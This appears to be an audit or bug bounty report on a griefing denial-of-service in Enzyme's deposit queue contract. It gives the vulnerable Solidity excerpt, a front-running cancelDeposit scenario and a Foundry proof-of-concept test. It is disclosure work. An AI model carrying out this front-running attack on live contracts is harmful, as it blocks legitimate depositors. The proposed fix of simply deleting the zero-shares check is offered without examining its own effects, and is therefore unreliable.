## Title
Malicious depositor can grief batch deposit processing (DoS-by-revert)

## Brief/Intro
A revert can occur inside a for-loop while executing multiple queued deposit requests, causing the entire batch processing to fail. An attacker can cancel a single request immediately before an admin-triggered batch execution, forcing the loop to revert and preventing all other pending deposits from being processed. This leads to denial-of-service / griefing of legitimate depositors.

Affected components:
ERC7540LikeDepositQueue.sol — executeDepositRequests (core issue) at L292.

## Vulnerability Details
The executeDepositRequests function iterates through an admin-supplied list of request IDs and processes each one. 
```solidity
File: ERC7540LikeDepositQueue.sol
262:     function executeDepositRequests(uint256[] memory _requestIds) external onlyAdminOrOwner {
263:         Shares shares = Shares(__getShares());
264:         IFeeHandler feeHandler = IFeeHandler(shares.getFeeHandler());
265:         ValuationHandler valuationHandler = ValuationHandler(shares.getValuationHandler());
266:         (uint256 sharePriceInValueAsset,) = valuationHandler.getSharePrice();
267: 
268:         // Fulfill requests
269:         uint256 totalAssetsDeposited;
270:         for (uint256 i; i < _requestIds.length; i++) {
271:             uint128 requestId = _requestIds[i].toUint128();
272:             DepositRequestInfo memory request = getDepositRequest({_requestId: requestId});
273: 
274:             // Remove request
275:             __removeDepositRequest({_requestId: requestId});
276: 
277:             // Add to total assets deposited
278:             totalAssetsDeposited += request.assetAmount;
279: 
280:             // Calculate gross shares
281:             uint256 value =
282:                 valuationHandler.convertAssetAmountToValue({_asset: asset(), _assetAmount: request.assetAmount});
283:             uint256 grossSharesAmount =
284:                 ValueHelpersLib.calcSharesAmountForValue({_valuePerShare: sharePriceInValueAsset, _value: value});
285:             // Settle any entrance fee
286:             uint256 feeSharesAmount = address(feeHandler) == address(0)
287:                 ? 0
288:                 : feeHandler.settleEntranceFeeGivenGrossShares({_grossSharesAmount: grossSharesAmount});
289: 
290:             // Calculate net shares
291:             uint256 netShares = grossSharesAmount - feeSharesAmount;
292:             require(netShares > 0, ERC7540LikeDepositQueue__ExecuteDepositRequests__ZeroShares());   // @audit: netShares will be 0 if the request is cancelled.
...
307:     }
```
During processing it computes gross shares and then settles an entrance fee:
If netShares equals 0 (for example, because the request was cancelled or modified between iteration start and processing), the require() causes a revert. 
Because this revert occurs inside the loop, it aborts processing of the entire batch and rolls back state changes made earlier in the same transaction. 
An attacker can exploit this by canceling a single request that is included in an upcoming executeDepositRequests call (e.g., by front-running and calling cancelDeposit), thereby causing the admin-initiated batch to revert and blocking processing of all other requests in that batch.

## Attack scenario (practical)
Deposit queue uses DepositRestriction = None and has a short minRequestDuration.
Attacker submits multiple deposit requests that look normal alongside legitimate requests.
When admin calls executeDepositRequests with a set that includes the attacker’s request(s), the attacker front-runs and calls cancelDeposit on one of their requests just before execution is finalized.
During execution, processing the now-cancelled request yields netShares == 0 and triggers the require(), reverting the whole transaction. Legitimate requests in that batch are not processed.

## Impact Details
Griefing / partial DoS: Legitimate deposit requests can be delayed repeatedly or indefinitely if attackers repeatedly cancel or manipulate any single request included in admin batches.


## Suggested fixes (recommended)
It's better not to revert inside for-loop.
```solidity
  // Calculate net shares
  uint256 netShares = grossSharesAmount - feeSharesAmount;
  // require(netShares > 0, ERC7540LikeDepositQueue__ExecuteDepositRequests__ZeroShares());   // @audit: Remove this revert.
```


## References
https://github.com/enzymefinance/protocol-onyx/blob/81c92099748f6ed7d721481090adaaaae086e773/src/components/issuance/deposit-handlers/ERC7540LikeDepositQueue.sol#L292

## Proof of Concept
This is unit test code.
```solidity
    function test_executeDepositRequests_DoSed() public {
        // Define requests
        address request1Controller = makeAddr("controller1");
        address request2Controller = makeAddr("controller2");
        address request3Controller = makeAddr("controller3");

        uint256 request1AssetAmount = 5_000_000; // 5 units with 6 decimals
        uint256 request3AssetAmount = 10_000_000; // 10 units with 6 decimals

        uint128 depositAssetToValueAssetRate = 4e18; // 1 depositAsset : 4 valueAsset
        // sharePrice = 1e18; // Keep it simple with 1:1 share price

        uint256 request1GrossSharesAmount = 20e18; // 5 shares * 4 rate = 20 shares
        uint256 request3GrossSharesAmount = 40e18; // 10 shares * 4 rate = 40 shares

        uint256 request1FeeSharesAmount = 1e18; // 10% fee of 10 shares
        uint256 request3FeeSharesAmount = 2e18; // 10% fee of 20 shares

        uint256 request1ExpectedSharesAmount = request1GrossSharesAmount - request1FeeSharesAmount;
        uint256 request3ExpectedSharesAmount = request3GrossSharesAmount - request3FeeSharesAmount;

        // Create and set the asset
        uint8 assetDecimals = 6;
        address asset = address(new MockERC20(assetDecimals));
        vm.prank(admin);
        depositQueue.setAsset({_asset: asset});

        // Set a min request time
        vm.prank(admin);
        depositQueue.setDepositMinRequestDuration(10);

        // Set the asset rate
        vm.prank(admin);
        valuationHandler.setAssetRate(
            ValuationHandler.AssetRateInput({
                asset: asset, rate: depositAssetToValueAssetRate, expiry: uint40(block.timestamp + 100)
            })
        );

        // Mock and set a fee handler with different fee amounts for each request shares amount
        address mockFeeHandler = makeAddr("mockFeeHandler");
        feeHandler_mockSettleEntranceFeeGivenGrossShares({
            _feeHandler: mockFeeHandler,
            _feeSharesAmount: request1FeeSharesAmount,
            _grossSharesAmount: request1GrossSharesAmount
        });
        feeHandler_mockSettleEntranceFeeGivenGrossShares({
            _feeHandler: mockFeeHandler,
            _feeSharesAmount: request3FeeSharesAmount,
            _grossSharesAmount: request3GrossSharesAmount
        });        
        feeHandler_mockSettleEntranceFeeGivenGrossShares({
            _feeHandler: mockFeeHandler,
            _feeSharesAmount: 0,
            _grossSharesAmount: 0
        });

        vm.prank(admin);
        shares.setFeeHandler(mockFeeHandler);

        // Seed controllers with asset, and grant allowance to the queue
        address[3] memory controllers = [request1Controller, request2Controller, request3Controller];
        for (uint256 i; i < controllers.length; i++) {
            deal(asset, controllers[i], 1000 * 10 ** IERC20(asset).decimals(), true);
            vm.prank(controllers[i]);
            IERC20(asset).approve(address(depositQueue), type(uint256).max);
        }

        // Create the requests
        vm.prank(request1Controller);
        depositQueue.requestDeposit({
            _assets: request1AssetAmount, _controller: request1Controller, _owner: request1Controller
        });
        vm.prank(request2Controller);
        depositQueue.requestDeposit({_assets: 456, _controller: request2Controller, _owner: request2Controller});
        vm.prank(request3Controller);
        depositQueue.requestDeposit({
            _assets: request3AssetAmount, _controller: request3Controller, _owner: request3Controller
        });

        // Warp to an arbitrary time for the request
        uint256 requestTime = 60;
        vm.warp(requestTime);

        // Front run!!
        vm.prank(request1Controller);
        uint256 assetAmountRefunded = depositQueue.cancelDeposit(1);                // @audit: Attacker front-run the following executeDepositRequests() call.

        // Define ids to execute: first and last items
        uint256[] memory requestIdsToExecute = new uint256[](2);
        requestIdsToExecute[0] = 1;
        requestIdsToExecute[1] = 3;

        vm.expectRevert(ERC7540LikeDepositQueue.ERC7540LikeDepositQueue__ExecuteDepositRequests__ZeroShares.selector);

        // Execute the requests
        vm.prank(admin);
        depositQueue.executeDepositRequests({_requestIds: requestIdsToExecute});    // @audit: This should revert because of ERC7540LikeDepositQueue#L292.
    }
```

To run this test code, please run
```
forge test -vvvv --match-test executeDepositRequests_DoSed
```